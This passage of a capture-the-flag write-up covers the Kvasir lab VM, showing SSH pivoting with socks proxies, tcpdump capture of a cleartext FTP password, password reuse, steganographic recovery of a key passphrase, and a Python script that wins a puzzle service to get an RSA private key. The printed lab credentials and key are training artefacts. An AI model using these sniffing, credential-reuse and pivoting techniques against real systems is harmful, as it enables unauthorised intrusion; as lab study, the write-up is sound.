connect to [192.168.56.101] from (UNKNOWN) [192.168.56.102] 53870
listening on [any] 222 &hellip;
```</p>

<p>Lets take a look at a updated network diagram, detailing where I am in the network now. The new port forward is denoted in red:</p>

<p><img class="<a" src="href="https://i.imgur.com/A2463Kc.png">https://i.imgur.com/A2463Kc.png</a>"></p>

<p>Lets try and SSH in with the key pair that I generated and loaded using the MySQL UDF:</p>

<p>```bash
root@kali:~# ssh -D 8000 <a href="&#109;&#x61;&#105;&#108;&#x74;&#111;&#x3a;&#x72;&#111;&#111;&#x74;&#x40;&#x31;&#x32;&#x37;&#46;&#x30;&#46;&#48;&#x2e;&#x31;">&#x72;&#111;&#111;&#x74;&#x40;&#x31;&#50;&#x37;&#x2e;&#x30;&#x2e;&#x30;&#x2e;&#49;</a> -p222 -i kvasir_key
Linux db 3.2.0-4-amd64 #1 SMP Debian 3.2.60-1+deb7u3 x86_64</p>

<p>The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.</p>

<p>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Nov  9 07:13:17 2014 from 192.168.2.100
root@db:~#
```</p>

<p>I added the <code>-D</code> option so that I may have a socks proxy to work with should any further tunneling be required. This means now that with the SSH session built, I have a <em>almost</em> <em>direct</em> connection to the <code>db</code> (192.168.2.200) host, as denoted in green below:</p>

<p><img class="<a" src="href="https://i.imgur.com/wHNJJ5g.png">https://i.imgur.com/wHNJJ5g.png</a>"></p>

<p>8-)</p>

<h2>not exactly nsa level spying but heh</h2>

<p>Initial enumeration revealed that this host (<code>db</code>) had 2 network interfaces. One with IP <strong>192.168.2.200</strong> (the one I came in from), and another with IP <strong>192.168.3.200</strong>. There were also 2 entries in <code>/etc/hosts</code> about 2 hosts in the 3.x network:</p>

<p>```bash
root@db:~# cat /etc/hosts</p>

<h1>192.168.3.40  celes</h1>

<h1>192.168.3.50  terra</h1>

<p>[&hellip; snip &hellip;]
```</p>

<p>The host was also running a mysql server (the one we pwnd), and a pure-ftpd server:</p>

<p><code>bash
root@db:~# ps -ef
UID        PID  PPID  C STIME TTY          TIME CMD
root         1     0  0 Nov08 ?        00:00:00 init [3]  
root      1242     1  0 Nov08 ?        00:00:00 dhclient -v -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases eth0
root      1408     1  0 Nov08 ?        00:00:00 /usr/sbin/sshd
root      1434     1  0 Nov08 ?        00:00:00 /bin/sh /usr/bin/mysqld_safe
root      1761  1434  0 Nov08 ?        00:00:37 /usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql --plugin-dir=/usr/lib/mysql/plugin --user=root --pid-file=/var/run/mysqld/mysqld
root      1762  1434  0 Nov08 ?        00:00:00 logger -t mysqld -p daemon.error
root      1861     1  0 Nov08 ?        00:00:00 pure-ftpd (SERVER)
[... snip ...]
</code></p>

<p>A interesting file was in <code>/root/.words.txt</code>, which contained some random words, some of which i recognized as nicks in #vulnhub on freenode.</p>

<p><code>bash
root@db:~# head /root/.words.txt
borne
precombatting
noncandescent
cushat
lushness
precensure
romishness
nonderivable
overqualification
superkojiman
</code></p>

<p>And finally, a troll flag :D</p>

<p><code>bash
root@db:~# cat /root/flag
This is not the flag you're looking for... :p
</code></p>

<p>This was the first time I was really stuck on Kvasir. After quite a bit of poking around, I noticed a user <code>celes</code> in <code>/etc/pure-ftpd/pureftpd.passwd</code>, with a password that I was not able to crack. The host itself did not have this user configured either. I was starting to think that this server has nothing really to offer in the form of post exploitation and started planning exploration of neighboring hosts and their network services.</p>

<p>At one stage, I was checking to see what network activity was present on the interfaces, of which <code>eth0</code> had my SSH session, and <code>eth1</code> was quiet. At least, until I was about to close the tcpdump I had this sudden burst of packets:</p>

<p>```bash
root@db:~# tcpdump -i eth1
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth1, link-type EN10MB (Ethernet), capture size 65535 bytes
13:19:01.355970 IP 192.168.3.40.36425 > 192.168.3.200.<a href="ftp:">ftp:</a> Flags [S], seq 2471029534, win 14600, options [mss 1460,sackOK,TS val 13092832 ecr 0,nop,wscale 5], length 0
13:19:01.355988 IP 192.168.3.200.ftp > 192.168.3.40.36425: Flags [S.], seq 2507516314, ack 2471029535, win 14480, options [mss 1460,sackOK,TS val ack 535, win 490, options [nop,nop,TS val 13092837 ecr 13092836], length 0</p>

<p>[&hellip; snip &hellip;]</p>

<p>13:19:01.378604 IP 192.168.3.200.ftp > 192.168.3.40.36425: Flags [P.], seq 535:548, ack 53, win 453, options [nop,nop,TS val 13092837 ecr 13092837], length 13
13:19:01.378631 IP 192.168.3.40.36425 > 192.168.3.200.<a href="ftp:">ftp:</a> Flags [R], seq 2471029587, win 0, length 0
^C
29 packets captured
29 packets received by filter
0 packets dropped by kernel
```</p>

<p>I changed the command to add the <code>-X</code> flag as this looked like FTP traffic flowing over the interface (you haven&rsquo;t forgotten the ftp server yet have you?).</p>

<p>```bash
13:25:01.387981 IP 192.168.3.200.ftp > 192.168.3.40.36437: Flags [P.], seq 321:359, ack 13, win 453, options [nop,nop,TS val 13182840 ecr 13182839], length 38</p>

<pre><code>0x0000:  4510 005a 7e22 4000 4006 342b c0a8 03c8  E..Z~"@.@.4+....
0x0010:  c0a8 0328 0015 8e55 1bf0 5a96 015a 5499  ...(...U..Z..ZT.
0x0020:  8018 01c5 42a1 0000 0101 080a 00c9 2778  ....B.........'x
0x0030:  00c9 2777 3333 3120 5573 6572 2063 656c  ..'w331.User.cel
0x0040:  6573 204f 4b2e 2050 6173 7377 6f72 6420  es.OK..Password.
0x0050:  7265 7175 6972 6564 0d0a                 required..
</code></pre>

<p>13:25:01.388050 IP 192.168.3.40.36437 > 192.168.3.200.<a href="ftp:">ftp:</a> Flags [P.], seq 13:32, ack 359, win 490, options [nop,nop,TS val 13182840 ecr 13182840], length 19</p>

<pre><code>0x0000:  4500 0047 73fe 4000 4006 3e72 c0a8 0328  E..Gs.@.@.&gt;r...(
0x0010:  c0a8 03c8 8e55 0015 015a 5499 1bf0 5abc  .....U...ZT...Z.
0x0020:  8018 01ea a5ae 0000 0101 080a 00c9 2778  ..............'x
0x0030:  00c9 2778 5041 5353 2069 6d32 3242 4634  ..'xPASS.im22BF4
0x0040:  4858 6e30 310d 0a                        HXn01..
</code></pre>

<p>```</p>

<p>A cleartext username and password? Well aint that just handy! :D Just to confirm I wrote a pcap to disk with the <code>-W</code> flag, transferred it to my attacking machine and opened it in Wireshark so that I can inspect the whole FTP conversation.</p>

<p><img class="<a" src="href="https://i.imgur.com/YiwWzsy.png">https://i.imgur.com/YiwWzsy.png</a>"></p>

<p>It seems like <code>celes</code> is simply logging in, getting a directory listing, and logging out.</p>

<p>Taking a long shot, I wondered if the age old problem of password reuse is applicable here, so I tried to ssh in to <strong>192.168.3.40</strong> (the ip the FTP conversation was coming from) using <code>celes:im22BF4HXn01</code>:</p>

<p>```bash
root@db:~# ssh <a href="&#109;&#97;&#x69;&#108;&#116;&#x6f;&#x3a;&#x63;&#101;&#x6c;&#101;&#x73;&#64;&#49;&#x39;&#50;&#46;&#x31;&#54;&#56;&#46;&#x33;&#46;&#52;&#48;">&#x63;&#x65;&#108;&#101;&#115;&#64;&#x31;&#57;&#x32;&#x2e;&#49;&#54;&#56;&#x2e;&#x33;&#x2e;&#52;&#48;</a>
<a href="&#109;&#97;&#x69;&#108;&#116;&#111;&#58;&#x63;&#101;&#x6c;&#x65;&#115;&#64;&#49;&#x39;&#50;&#x2e;&#49;&#54;&#56;&#46;&#x33;&#x2e;&#x34;&#x30;">&#x63;&#101;&#108;&#x65;&#115;&#64;&#x31;&#x39;&#50;&#x2e;&#x31;&#54;&#x38;&#46;&#x33;&#46;&#x34;&#x30;</a>&rsquo;s password: # entered im22BF4HXn01
Linux dev1 3.2.0-4-amd64 #1 SMP Debian 3.2.60-1+deb7u3 x86_64</p>

<p>The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.</p>

<p>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
You have mail.
Last login: Thu Sep  4 09:20:00 2014
celes@dev1:~$
```</p>

<h2>finding terras secret</h2>

<p>Ok lets take a moment and make sure I know where I am in the network. The newly accessed server is denoted in red:</p>

<p><img class="<a" src="href="https://i.imgur.com/nXpoEBM.png">https://i.imgur.com/nXpoEBM.png</a>"></p>

<p>I don’t have connectivity directly to <strong>192.168.3.40</strong> at the moment, but if I really need that I can arrange it. For now, lets see what we have on <code>dev1</code>.</p>

<p>First, I find the sneaky ftp session script <code>getLogs.py</code>, that does exactly that which I saw in the packet captures. Next, I find a message in <code>celes</code> mailbox:</p>

<p>```bash
celes@dev1:~$ cat /var/spool/mail/celes
Return-path: &lt;celes@localhost>
Received: from celes by localhost with local (Exim 4.80)</p>

<pre><code>(envelope-from &lt;celes@localhost&gt;)
id 1XHczw-0000V2-8y
for celes@127.0.0.1; Wed, 13 Aug 2014 19:10:08 +0100
</code></pre>

<p>Date: Wed, 13 Aug 2014 19:10:08 +0100
To: <a href="&#109;&#97;&#x69;&#108;&#x74;&#x6f;&#58;&#x63;&#x65;&#x6c;&#101;&#115;&#x40;&#x31;&#x32;&#x37;&#46;&#x30;&#46;&#x30;&#46;&#49;">&#99;&#101;&#108;&#x65;&#115;&#x40;&#49;&#50;&#x37;&#46;&#48;&#46;&#x30;&#x2e;&#x31;</a>
Subject: Reminder
User-Agent: Heirloom mailx 12.5 6/20/10
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Message-Id: &lt;E1XHczw-0000V2-8y@localhost>
From: celes@localhost</p>

<p>Terra sent me kvasir.png and challenged me to solve the stupid little puzzle she has running on her machine&hellip; <em>sigh</em>
```</p>

<p>The message reveals that Terra has a puzzle on her machine (<strong>192.168.3.50</strong> from <code>/etc/hosts</code> on the <code>db</code> server?). She also mentions <code>kvasir.png</code>, which happens to be in <code>celese</code> home directory:</p>

<p><code>bash
celes@dev1:~$ ls -lah kvasir.png
-rw-r--r-- 1 celes celes 103K Sep  3 22:16 kvasir.png
</code></p>

<p>Lastly, the <code>.bash_history</code> for <code>celese</code> has a entry <code>stepic --help</code>. <code>stepic</code> is a steganography tool. So, it seemed pretty clear what needs to be done here. My guess was that kvasir.png has a piece of the puzzle that is on Terra&rsquo;s machine. So, I converted the <code>kvasir.png</code> image to hex, and copy pasted the output on my attacking machine into a text file and converted it back to a image using <code>xxd -r -p kvasir.png.xxd &gt; kvasir.png</code>.</p>

<p><img class="<a" src="href="https://i.imgur.com/DKIbriL.png">https://i.imgur.com/DKIbriL.png</a>"></p>

<h3>getting stepic to play nice</h3>

<p>With the image ready, I searched for <code>stepic</code> using <code>pip</code> in my virtual env and installed it:</p>

<p>```bash
(kvasir)root@kali:~# pip install stepic
Downloading/unpacking stepic
  Downloading stepic-0.4%7ebzr.tar.gz
  Running setup.py egg_info for package stepic</p>

<p>Installing collected packages: stepic
  Running setup.py install for stepic</p>

<pre><code>changing mode of build/scripts-2.7/stepic from 644 to 755

changing mode of /root/kvasir/bin/stepic to 755
</code></pre>

<p>Successfully installed stepic
Cleaning up&hellip;
```</p>

<p>However, <code>stepic</code> was not just a case of plug and play for me. <strong>NOPE</strong>:</p>

<p>```bash
(kvasir)root@kali:~# stepic
Traceback (most recent call last):
  File &ldquo;/root/kvasir/bin/stepic&rdquo;, line 24, in <module></p>

<pre><code>import Image
</code></pre>

<p>ImportError: No module named Image
```</p>

<p>Long story short, a small hack and installation of another dependency finally got it working for me:</p>

<p>```bash
(kvasir)root@kali:~# pip install pillow
Downloading/unpacking pillow
  Downloading Pillow-2.6.1.tar.gz (7.3Mb): 7.3Mb downloaded
  Running setup.py egg_info for package pillow</p>

<pre><code>Single threaded build, not installing mp_compile: 1 processes
</code></pre>

<p>[&hellip; snip &hellip;]</p>

<pre><code>*** OPENJPEG (JPEG2000) support not available
--- ZLIB (PNG/ZIP) support available
</code></pre>

<p>[&hellip; snip &hellip;]</p>

<p>Successfully installed pillow
Cleaning up&hellip;
```</p>

<p>The final hack was to change the installed <code>stepic</code> bin at <code>/root/kvasir/bin/stepic</code> line 24 from <code>import Image</code> to <code>from PIL import Image</code>. Finally, <code>stepic</code> was working fine.</p>

<h3>finding the secret</h3>

<p>With <code>stepic</code> up and running, I was finally able to run it against the image <code>kvasir.png</code>:</p>

<p>```bash
(kvasir)root@kali:~# stepic &mdash;decode &mdash;image-in=kvasir.png &mdash;out=out</p>

<h1>check the file type we got out</h1>

<p>root@kali:~# file out
out: ASCII text, with very long lines, with no line terminators</p>

<h1>check the output we got</h1>

<p>root@kali:~# cat out
89504e470d0a1a0a0000000d494844520000012200000122010300000067704df500000006504c5
445ffffff00000055c2d37e00000104494441540899ed98c90dc32010459152804b72eb2ec90544
22304bc089655f180ec9fb0730f07cfa9a0552420821f43fcaa6674aeb5e96dbe23b1b5434a58be
559bf1e59befa03a848aa5ab22de690f2d530a8895473086a365500e7a1265132b5b3bbfc05358e
7a57640b919bba0d358eeab55c9c418da7cc0df1a576a2792fa561ad035434a5920b808588d974e
215d4584acff4065626ffe9db47a8e194eec805a00d7621830aa6acffd40c95d5a6fa27d404cae5
55e13475410550e6cca113ed72145424a56ee8ab4f8989ecb5196a02d5bdfa2477e83333410553d
97ba093cc04154c89a439ba880ea881944c2d3aea0a6a0e75acc8528c4550e1144208a15fd70b88
df9bb4ae0a3dc20000000049454e44ae426082
```</p>

<p>At this stage I was pretty convinced my hacks to get <code>stepic</code> to work failed. I am also not really sure what to expect as output so that made it even harder to know if I had something to work with there.</p>

<p>Close study of the output string though got me started in trying to determine what this was that I had. My method involved me invoking a python shell and trying a bunch of <code>decode()</code> methods on it. I just took the first few characters of the output to play with as some decodings need specific string lengths etc:</p>

<p>```bash
root@kali:~# python
Python 2.7.3 (default, Mar 14 2014, 11:57:14)
[GCC 4.7.2] on linux2
Type &ldquo;help&rdquo;, &ldquo;copyright&rdquo;, &ldquo;credits&rdquo; or &ldquo;license&rdquo; for more information.</p>

<blockquote><blockquote><blockquote><p>&ldquo;89504e470d0a1a0a000000&rdquo;.decode(&ldquo;hex&rdquo;)
&lsquo;\x89PNG\r\n\x1a\n\x00\x00\x00&rsquo;</p>

<p>```</p></blockquote></blockquote></blockquote>

<p>Decoding it as <code>hex</code> revealed the part I needed to see&hellip; <code>PNG</code>! So this string was a hex encoded PNG image (unless thats a troll too&hellip;). I took <code>out</code> and reversed it using <code>xxd -r -p</code>:</p>

<p><code>bash
root@kali:~# xxd -p -r out &gt; kvasir2.png
root@kali:~# file kvasir2.png
kvasir2.png: PNG image data, 290 x 290, 1-bit colormap, non-interlaced
</code></p>

<p>Lets see what the image looks like:</p>

<p><img class="<a" src="href="https://i.imgur.com/r0wxCYh.png">https://i.imgur.com/r0wxCYh.png</a>"></p>

<p>A QR code! I fetched my phone and scanned it, revealing the string <code>Nk9yY31hva8q</code>. Great!&hellip; I think. Wait, what does this even mean? I got stumped again into wondering what this arb string is for that I have. It was not the root password for <code>dev1</code> either.</p>

<h2>playing Terra&rsquo;s game</h2>

<p>Without being able to place the string found in the QR code, I stepped one step back and decided to check out Terra&rsquo;s game as per the email. From the <code>/etc/hosts</code> on <code>db</code>, I saw a comment for <code>terra</code> as <strong>192.168.3.50</strong>. Using the SSH socks proxy on <code>tcp/8000</code> I setup when I setup the SSH session to <strong>192.168.2.200</strong>, I nmapped <strong>192.168.3.50</strong>.</p>

<p>```bash</p>

<h1>/etc/proxychains.conf has line</h1>

<h1>socks5    127.0.0.1 8000</h1>

<h1>scans will appear to be coming from 192.168.3.200 for</h1>

<h1>192.168.3.50</h1>

<p>root@kali:~# proxychains nmap -sT 192.168.3.50
ProxyChains-3.1 (<a href="http://proxychains.sf.net">http://proxychains.sf.net</a>)</p>

<p>Starting Nmap 6.46 ( <a href="http://nmap.org">http://nmap.org</a> ) at 2014-11-09 16:31 SAST
Nmap scan report for 192.168.3.50
Host is up (0.0012s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
4444/tcp open  krb524</p>

<p>Nmap done: 1 IP address (1 host up) scanned in 1.47 seconds
```</p>

<p>Well <code>tcp/4444</code> looks interesting! Lets have a look!</p>

<p>```bash
root@kali:~# proxychains nc 192.168.3.50 4444
ProxyChains-3.1 (<a href="http://proxychains.sf.net">http://proxychains.sf.net</a>)
Hello Celes &amp; Welcome to the Jumble!</p>

<p>Solve:indrssoses
Solve:roneb bob
Solve:abaerrbs</p>

<p>[&hellip; snip &hellip;]</p>

<p>Solve:iepasncm</p>

<p>Score: 0
Time: 22.71 secs
Just a bit embarrasing really&hellip;
```</p>

<p>Don&rsquo;t think I did too well there! :D Not to fear. I recognized some of the strings after the <em>Solve:</em> as ones that are scrambled from the previously found <code>.words.txt</code> file. So, my guess here was that I had to write a small script that will connect to the socket and answer with the unscrambled versions from <code>.words.txt</code>. With the <code>.words.txt</code> file locally available, I slapped together something to try and do this:</p>

<p>```python</p>

<h1>!/usr/bin/python</h1>

<h1>Kvasir Terra Puzzle Solver</h1>

<p>import sys
import socket
import base64</p>

<h1>read the words.txt we got into a list</h1>

<p>with open(&lsquo;words.txt&rsquo;) as f:</p>

<pre><code>words = f.read().splitlines()
</code></pre>

<h1>connection to the game</h1>

<p>sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((&lsquo;192.168.3.50&rsquo;, 4444))</p>

<h1>start processing the lines</h1>

<p>while True:</p>

<pre><code># receive a frame large enough
frame = sock.recv(150)

# check that its a question frame
if 'Solve' not in frame:
    print "[!] 'Solve' not in frame. Game over?"
    break

# split the frame with :
frame = frame.split(':')
if len(frame) &lt; 2:
    print "[!] Was unable to split by :. Game over?"
    break

question = frame[1].strip()

# @barrebas suggested a length check too to increase probability :)
result = [s for s in words if not s.strip(question) and len(question) == len(s)]
#result = [s for s in words if not s.strip(question)]

if len(result) &lt; 1:
    print "[!] Was unable to match anything to %s" % question
    continue

answer = result[0].strip()

print "[+] Matched %s to %s" % (question, answer)
sock.send(answer)
</code></pre>

<h1>did we win? \:D/</h1>

<p>if &lsquo;You\&rsquo;re a winner&rsquo; in frame:</p>

<pre><code>print "[+] We won!"

# read the rest of the socket output
frame += sock.recv(2500)

# base64 decode the last string
print "[+] Extracing and decoding the base64 section"
print base64.b64decode(frame.split('\n')[-1])
sys.exit(0)
</code></pre>

<p>sock.close</p>

<h1>work with what we have left</h1>

<p>print &ldquo;[+] Last frame was:\n %s&rdquo; % frame
print &ldquo;[+] Done&rdquo;
sys.exit(0)
```</p>

<p>Once you are able to get a score of 120 it seems, you are considered a winner. Once you have won, a fairly large string is output again. This string appeared to be a base64 encoded string, and as a result, I added the <code>base64.b64decode(frame.split('\n')[-1])</code> section to the script so that if you win it will print the cleartext version.</p>

<p>The script is not perfect. Sometimes you don’t get 120 as a score and have to run it again. But, within a reasonable amount of attempts you are able to beat the game. A sample run would be:</p>

<p>```bash
root@kali:~# proxychains ./play.py
ProxyChains-3.1 (<a href="http://proxychains.sf.net">http://proxychains.sf.net</a>)
[+] Matched atravdeii to radiative
[+] Matched oilyaerbdmpn to imponderably</p>

<p>[&hellip; snip &hellip;]
[+] Matched idmlhkeir to kriemhild
[!] &lsquo;Solve&rsquo; not in frame. Game over?
[+] We won!
[+] Extracing and decoding the base64 section
&mdash;&mdash;-BEGIN RSA PRIVATE KEY&mdash;&mdash;&ndash;
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,76841822AB9E772FD1D653F6179F0E4D</p>

<p>OrEM2ocnhHKg5nuH7ps1CoOJCihasmFJKLOVNNYFOhGKUojPYEta5yOhIskf0h0r
So+xVDK67G3DlgymUV3DxGfizLfZvhxQRC8Qy0mf4N+miYkvf2NaFtatpNcjK5pM
Uy6QSFMOC8aKpe0FL6UGDRJQ5GSG4DlJrLUJBMvnSLtYZHlaWAICKbXfpXV4STwv
J0D8h9RtlRJhLCK5eKgupYCQIiGQWg3PvZpXk9kkjXhmOQwUYoCRl3l4j5zlnFcT
P6U9UPhRq/Ck4Qrk2dGxFfppQd9xW+b4PWjiSCikLF3Q0hfNNvEbu4ounAgYwPFH
jOXHJqxVog/pZz9Y8XfSP3hz9AYHWfI2iC9Cnk7boRcOv+mcgEeWWkYrVscOivYj
9N2xiNp4GH+NIG8mm/Ldl7jQMl/Vrr5cx3fXjOezmgsSkAY4CcspwKsSXK8GL/bO
hT6pKWfL6UI8wUgpI7KhgK+AOKuS/XPYTSdz+0RJxNFSLOFNcjRtL+NW0UjPq5Jh
Dia+pw5qB+lllxgaN0WBQskIFQpppPowwjG8Jg8jJBjSYj3r4LIrZwJSpcvoBiUA
oCqnQUMtXlMh9/CvBBGs1+JVcjkInBde945V+ejhP6GPYju4TQV7B70d7aEW0OEm
0d7nrOW/LCYpsV/N5rqVsGlTvwjJNowyMqEZ9E09guM5eL4CEPPmp9ZDey2fBAGw
q7nSr8q6Hsf4d+YPR+90EfMJReqI3s1FQoTvx+PaFPiKw7dfHFCgLscXcXcognLz
cB0lnemI+cFmfY74F1eYL3fwJIwSRgK85Xc2My8sqJz1izj6IlO2kQ1jLkrhJOZ8
X+p/9w5zA0x2fbjppHac+YoJfyPyYXjkpigDPjHXhRit2qnUrHfDc0Fjh5AKNU2K
MU/ywXGEg6w0CppK9JBo0u/xJlhT/jOWNiM4YZjXlhQzkxyebvbyRS6Slhlo142l
gMuMUvPn1fAenir6AFwy2rlktQ5/a8z2VCwPkNA40MImSHMWRSFboDjM5zwr24Gk
N0pI1BCmCsf0msvEwLhdcVnhJY7Bg4izm5bX+ArV/ymLOkybK8chz5fryXcjeV1q
izJe2AXZk1/8hY80tvJWjxUEfnguyoozQf5T74mn5aez9JgGWMqzpfKwZ6Lx5cTg
Zu+m+ryakBPFjUtt04lCYCCKWQzPhgIr5xUFx62hCGhh6W8tSIB6k7Hpun123GQ0
uT+R0ErYA5Gdyx44FZEatZ3rXCpVmJllCTWUqBuaHYAtcZThTTZfxRFHy02IT6FW
PLCZ/XN2E+TdtkXmFcTXRsgtyA/5VXsTWWmRcHczv5g5YcQ3pHs3MhSxsWSdTz/8
RYzmxOnCjZWXaUe0Xb7FjA/evmpXsyhChGbvp0K0hZFcMeszFKa8K4pAedcyG31n
4+HhImnEpLZQOXhfXlkKMQXrBys7hkonkDp57Vqh+IIZLGzVmfTVEj2Whc/0Y+GI
DMph0ZvTG+Jgv1LO3Sl82Rzm1jUkzEIZNIxYeSGrZf6ChVLPa85axqw5EVNCxYUg
JAqg+ud6xIO9obidxzI2rLfbxcpMur80nb4crYMNm09yPQaskngK/4IjmnPLeTih
&mdash;&mdash;-END RSA PRIVATE KEY&mdash;&mdash;&ndash;
```</p>

<p>A private key? Encrypted though :( Remembering the string I got from the QR code earlier that had no affiliation to anything yet, I tried that as the password to decrypt:</p>

<p>```bash
root@kali:# openssl rsa -in terra_key -out terra_key_nopass
Enter pass phrase for terra_key: # entered Nk9yY31hva8q
writing RSA key</p>

<p>root@kali:~# cat terra_key_nopass
&mdash;&mdash;-BEGIN RSA PRIVATE KEY&mdash;&mdash;&ndash;
MIIEpAIBAAKCAQEAyekXwhcscSSzT3vw5/eL2h1Bb55vEIOOAkQpIQQ/ldnyT6Yt
w0dAaN71JidjfojzvdaZRNrRY5wkdHUr2t93TJx8vKDZ+n5up4nCKle3p2sz2hKP
DhP7LvxkVTM7Io3qoAYXefggTOWvfoK8X8pXE3xAdIyF4uCXmDjeg6UKoCr5XiWP
12YQEODLd+tp9RH4R/rCaencsNsta45sY1NXtWuJje4HVkPV8ei04ce8SP5PwVhV
sfp2Hxr8g4IKn7ZTwtmkD1SuvmZoyDHNAsToqFt2RiVE9yLQj94Gcagx7PqUijeH
b+4T+6tuDZtjgct4RdYZejnUOYx+iHiSjl6xCQIDAQABAoIBADYOi+fQ4HsiQkeD
fUn9gpnQv1Ys6rtXHUwKB6DpTETIZxFgAlyH1Py+xI+EeCTGcctfiwVeODUc9r2f
KTCeJ4iBVPwDbJieBO4h+bPwbCEMmINH+LjiLJu1wv70il6D9E8Hkn17Ktqrm8KZ
KenTeGClIXSSsr29N5jvkNNZ+nBK116l2TNNSsiWGc3VnezgCuRnDMSuKmA4P/OD
5F/h2/1sC33P1P5zxSMMsUZbm616AXNdv2DxHYm5b7p0L3/wzpZaJ+ZCp9jutbMO
P7XADZrFSn1EOk9blfVQz77GhRUVAotXKv7Jj4x+zHjq2l3n2Jk5RwJLl8iw4vZ+
ActgrskCgYEA5RhweA1naUanRJtlnLY4ywjfpZffPOZovmthqeOYdSJmwdmKvf08
bBR7hRwwlwgD92jeZWC1nK2zjwVpVQqV3sq4+x6Yspp0T5d9hp7PqUvPGglRdPXX
JQjMBV/Q2fK+ydnTz3xImjIvGsoFya9B/COKicu5ugCklCxtdNPJd/8CgYEA4Z9c
cekfgeha7sYe202krz0m03b8IqFaEMBUkEDmr8+RTL2H+9ciu3/2y/0UJ20w3qwe
gWv2OvOmumJ2wi/HVQdoQ9purzKWDdes6QrQsZ6+4eeylQmVmBSOF9YiVudSwyBM
+2rmE4m4qAIVidIJskb6DpB+fxDU1iWFLHlUFvcCgYEArxV8buOfkp+CmjZA9AF3
agQAGCf3Xi2hA1ZBr3rXOz3tVl0RYZ21ncwRkms231Yq4dxtiwDcCz/dKIK0O1/5
pek8cf6yKF1OYr2eG1In1nSvdHCGpmJz6EPO2JSfotGX6d/ltn5/ZgjQYyLeRYMB
ZNcsu57M9FAld3B0voJVSLUCgYACac72VPUGUbLvTOU1mU4CpdfNeT9XK3yoIzaE
WH1fMgwu0vQqaHGxqbu9ENbvWQalyxeEcOAwXzzQT49Pom0yZqLh3utCKntaaI0r
7Pawf68xAWZym6ii+M1QSfUSEuVauvS317vgR5/XBDaww7Ng2cuA7mC8ATUVmU8k
W6PfnwKBgQCBapB8OxxeRoFlnctafkTqtlNU5MGgiUGCCk/NNpDJhzaBuSdxdbRB
bQ6OJjQ9fbjF24w1iOJCGTtMQ0fxer7oxoM8TblM/eYx3Dg6MwsVApP75VdqzSas
mlJnXivwgJkeju+L42BMEl4UaxuhFPBSNCmlLBPj3Hdgyh5LSyIKmw==
&mdash;&mdash;-END RSA PRIVATE KEY&mdash;&mdash;&ndash;
```</p>

<p>Considering that <strong>192.168.3.50</strong> was named as <code>terra</code> in that <code>/etc/hosts</code> file, I attempted authentication using this key on it:</p>

<p>```bash
root@kali:~# proxychains ssh -D 8001 <a href="&#x6d;&#97;&#105;&#x6c;&#116;&#x6f;&#58;&#x74;&#101;&#x72;&#114;&#x61;&#x40;&#x31;&#57;&#x32;&#46;&#49;&#54;&#x38;&#46;&#x33;&#x2e;&#53;&#48;">&#116;&#101;&#114;&#x72;&#x61;&#x40;&#49;&#x39;&#50;&#x2e;&#x31;&#x36;&#x38;&#x2e;&#x33;&#x2e;&#x35;&#48;</a> -i terra_key_nopass
ProxyChains-3.1 (<a href="http://proxychains.sf.net">http://proxychains.sf.net</a>)
Linux dev2 3.2.0-4-amd64 #1 SMP Debian 3.2.60-1+deb7u3 x86_64</p>

<p>The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.</p>

<p>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
You have mail.
Last login: Sun Nov  9 07:13:31 2014 from 192.168.3.200
terra@dev2:~$
```</p>

<p>As you can see, I also opened another socks proxy locally on port <code>tcp/8001</code> in the case for any further pivoting needs. Again, to make sure we understand where in the network we are, consider the following diagram, with the path to <code>dev2</code> in red:</p>

<p><img class="<a" src="href="https://i.imgur.com/Pt8SFVJ.png">https://i.imgur.com/Pt8SFVJ.png</a>"></p>

<h2>letting myself in via the back door</h2>

<p>Enumerating <code>dev2</code> did not reveal much interesting information. In fact, the most important clue found was in a mail for <code>terra</code> from Locke:</p>

<p>```bash
terra@dev2:~$ cat /var/spool/mail/terra
Return-path: <a href="&#109;&#97;&#105;&#108;&#116;&#111;&#58;&#108;&#x6f;&#x63;&#x6b;&#x65;&#64;&#x31;&#57;&#50;&#46;&#x31;&#54;&#x38;&#x2e;&#52;&#46;&#49;&#x30;&#48;">&#x6c;&#111;&#x63;&#107;&#101;&#x40;&#x31;&#x39;&#x32;&#x2e;&#x31;&#x36;&#x38;&#46;&#x34;&#x2e;&#49;&#x30;&#48;</a>
Received: from locke by 192.168.4.100 with local (Exim 4.80)
~       (envelope-from &lt;locke@adm>)
~       id 1XHczw-0000V2-8y
~       for terra@192.168.3.50; Wed, 13 Aug 2014 19:10:08 +0100</p>

<p>Date: Wed, 13 Aug 2014 19:10:08 +0100
To: <a href="&#109;&#x61;&#x69;&#x6c;&#x74;&#111;&#58;&#x74;&#101;&#x72;&#114;&#97;&#64;&#49;&#x39;&#x32;&#x2e;&#x31;&#54;&#56;&#46;&#x33;&#x2e;&#53;&#x30;">&#116;&#x65;&#114;&#114;&#97;&#64;&#49;&#x39;&#x32;&#x2e;&#x31;&#x36;&#56;&#46;&#51;&#x2e;&#x35;&#48;</a>
Subject: Port Knock
User-Agent: Heirloom mailx 12.5 6/20/10
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Message-Id: &lt;E1XHczw-0000V2-8y@adm>
